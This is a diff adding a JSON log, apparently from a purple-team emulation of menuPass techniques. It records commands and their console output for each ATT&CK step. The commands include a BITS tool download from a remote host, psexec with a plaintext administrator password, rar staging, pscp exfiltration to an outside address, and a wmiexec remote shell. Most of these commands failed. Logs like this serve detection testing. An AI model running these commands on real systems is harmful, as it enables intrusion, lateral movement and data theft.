@@ -1,0 +1,393 @@
+{
+    "attire-version": "1.1",
+    "execution-data": {
+        "execution-command": "python calderalone.py",
+        "execution-id": "mmbqye",
+        "execution-source": "Calder-alone",
+        "execution-category": {
+            "name": "Calder-alone",
+            "abbreviation": "CDA"
+        },
+        "target": {
+            "host": "vcs",
+            "ip": "0.0.0.0",
+            "path": "PATH=C:",
+            "user": "vcs-purple-team"
+        },
+        "time-generated": "2024-10-01T08:04:11.000Z"
+    },
+    "procedures": [
+        {
+            "procedure-name": "Ingress Tool Transfer",
+            "procedure-description": "Pushing tools to compromised host",
+            "procedure-id": {
+                "type": "guid",
+                "id": "a750b196-8168-461a-8747-bdc4add107ac"
+            },
+            "mitre-technique-id": "T1105",
+            "order": 1,
+            "steps": [
+                {
+                    "command": "Start-BitsTransfer -Source \"http://remote-host/TWUEGJDITXAONVPUOWFV\" -Destination \"C:\\ProgramData\\temp\\TWUEGJDITXAONVPUOWFV\"",
+                    "executor": "psh",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:11.000Z",
+                    "time-stop": "2024-10-01T08:04:18.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "Start-BitsTransfer : Cannot find path 'C:\\ProgramData\\temp' because it does not exist.\nAt line:1 char:1\n+ Start-BitsTransfer -Source \"http://remote-host/TWUEGJDITXAONVPUOWFV\"  ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (C:\\ProgramData\\temp:String) [Start-BitsTransfer], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : PathNotFound,Microsoft.BackgroundIntelligentTransfer.Management.NewBitsTransferCommand\n \n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Network Share Discovery",
+            "procedure-description": "Display network shares",
+            "procedure-id": {
+                "type": "guid",
+                "id": "7877ec4d-3c11-40f2-9650-35261e4ac879"
+            },
+            "mitre-technique-id": "T1135",
+            "order": 2,
+            "steps": [
+                {
+                    "command": "net use",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:20.000Z",
+                    "time-stop": "2024-10-01T08:04:21.000Z",
+                    "output": [
+                        {
+                            "content": "New connections will be remembered.\n\nThere are no entries in the list.\n\n",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Remote System Discovery",
+            "procedure-description": "Identify remote systems using net",
+            "procedure-id": {
+                "type": "guid",
+                "id": "e132a235-fe43-45c2-a334-2f235a7646b5"
+            },
+            "mitre-technique-id": "T1018",
+            "order": 3,
+            "steps": [
+                {
+                    "command": "net view /domain",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:23.000Z",
+                    "time-stop": "2024-10-01T08:04:29.000Z",
+                    "output": [
+                        {
+                            "content": "Domain\n\n-------------------------------------------------------------------------------\nWORKGROUP            \nThe command completed successfully.\n\n",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Remote System Discovery",
+            "procedure-description": "Identify remote system using Powershell",
+            "procedure-id": {
+                "type": "guid",
+                "id": "d19678ac-3bca-475e-89d4-f452bfc2cc2a"
+            },
+            "mitre-technique-id": "T1018",
+            "order": 4,
+            "steps": [
+                {
+                    "command": "Test-NetConnection \"192.0.2.10\"",
+                    "executor": "psh",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:31.000Z",
+                    "time-stop": "2024-10-01T08:04:47.000Z",
+                    "output": [
+                        {
+                            "content": "WARNING: Ping to 192.0.2.10 failed with status: TimedOut\n\n\nComputerName           : 192.0.2.10\nRemoteAddress          : 192.0.2.10\nInterfaceAlias         : Ethernet0\nSourceAddress          : 192.168.229.128\nPingSucceeded          : False\nPingReplyDetails (RTT) : 0 ms\n\n\n\n",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Network Service Scanning",
+            "procedure-description": "Enumerate remote hosts for running services using tcping",
+            "procedure-id": {
+                "type": "guid",
+                "id": "b6026408-c815-47ca-bbb0-6b74591badc8"
+            },
+            "mitre-technique-id": "T1046",
+            "order": 5,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\tcping.exe\" \"192.0.2.10\" \"445\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:49.000Z",
+                    "time-stop": "2024-10-01T08:04:49.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\tcping.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "System Network Configuration Discovery",
+            "procedure-description": "Scan for nameservers and enumerate NetBIOS sessions",
+            "procedure-id": {
+                "type": "guid",
+                "id": "814005f7-c8d3-45c8-aea2-45758b2d6e90"
+            },
+            "mitre-technique-id": "T1016",
+            "order": 6,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\nbtscan.exe\" 192.0.2.34/24",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:51.000Z",
+                    "time-stop": "2024-10-01T08:04:51.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\nbtscan.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "System Network Configuration Discovery",
+            "procedure-description": "Scan for nameservers and enumerate NetBIOS sessions",
+            "procedure-id": {
+                "type": "guid",
+                "id": "9d543214-6476-429a-9ca1-cf12233b808c"
+            },
+            "mitre-technique-id": "T1016",
+            "order": 7,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\netsess.exe\" 192.0.2.10",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:53.000Z",
+                    "time-stop": "2024-10-01T08:04:53.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\netsess.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Service Execution",
+            "procedure-description": "Using compiled psexec.py to achieve remote code execution",
+            "procedure-id": {
+                "type": "guid",
+                "id": "4b1748e5-532c-453c-b195-557ce5550fef"
+            },
+            "mitre-technique-id": "T1569.002",
+            "order": 10,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\psexec.exe\" \"Administrator\":\"badpassword123\"@\"192.0.2.10\" \"-c^ d.exe\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:56.000Z",
+                    "time-stop": "2024-10-01T08:04:56.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\psexec.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Archive Collected Data - Archive via Utility",
+            "procedure-description": "Compress and stage data for exfiltration",
+            "procedure-id": {
+                "type": "guid",
+                "id": "160a1e0f-0f9b-49bb-a0fe-7e362b51737f"
+            },
+            "mitre-technique-id": "T1560.001",
+            "order": 11,
+            "steps": [
+                {
+                    "command": "C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\rar.exe a \"ss.rar\" \"C:\\Windows\\Temp\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:04:58.000Z",
+                    "time-stop": "2024-10-01T08:04:58.000Z",
+                    "output": [
+                        {
+                            "content": "\nRAR 5.71 x64   Copyright (c) 1993-2019 Alexander Roshal   28 Apr 2019\nTrial version             Type 'rar -?' for help\n\nEvaluation copy. Please register.\n\nProgram aborted\n",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "\nCannot read contents of C:\\C:\\Windows\\Temp\\*\nThe filename, directory name, or volume label syntax is incorrect.\nCannot create \\ss.rar\\.rar\nThe system cannot find the path specified.",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Recycle Bin Staging",
+            "procedure-description": "menuPass actors are thought to have staged archives in the Recycle Bin for exfiltration.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "b4fa6d2e-ed9c-4a86-81aa-19331983fe0d"
+            },
+            "mitre-technique-id": "T1074.001",
+            "order": 12,
+            "steps": [
+                {
+                    "command": "copy aa.rar \"C:\\$Recycle.Bin\\\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:05:00.000Z",
+                    "time-stop": "2024-10-01T08:05:00.000Z",
+                    "output": [
+                        {
+                            "content": "The system cannot find the file specified.\n",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Transfer Data to Cloud Account",
+            "procedure-description": "Exfil data to cloud account",
+            "procedure-id": {
+                "type": "guid",
+                "id": "ea4bc858-ba13-4f97-9df3-c543d8f3d44c"
+            },
+            "mitre-technique-id": "T1537",
+            "order": 13,
+            "steps": [
+                {
+                    "command": "\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\pscp.exe\" \"C:\\Windows\\Temp\\exfil\" \"Administrator\"@\"192.0.2.10\":/\"temp\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:05:02.000Z",
+                    "time-stop": "2024-10-01T08:05:02.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\pscp.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Windows Management Instrumentation",
+            "procedure-description": "Using wmiexec.vbs to execute tactical malware",
+            "procedure-id": {
+                "type": "guid",
+                "id": "8911d502-747a-4155-adcd-b03a1f284ee7"
+            },
+            "mitre-technique-id": "T1047",
+            "order": 14,
+            "steps": [
+                {
+                    "command": "cscript.exe \"C:\\Windows\\Temp\\C:\\Users\\thanh\\adversary-emulation-plans\\memupass\\payloads\\wmiexec.vbs\" /shell \"192.0.2.10\"",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T08:05:04.000Z",
+                    "time-stop": "2024-10-01T08:05:04.000Z",
+                    "output": [
+                        {
+                            "content": "Microsoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nCScript Error: Execution of the Windows Script Host failed. (Not enough memory resources are available to complete this operation. )\n",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        }
+    ]
+}
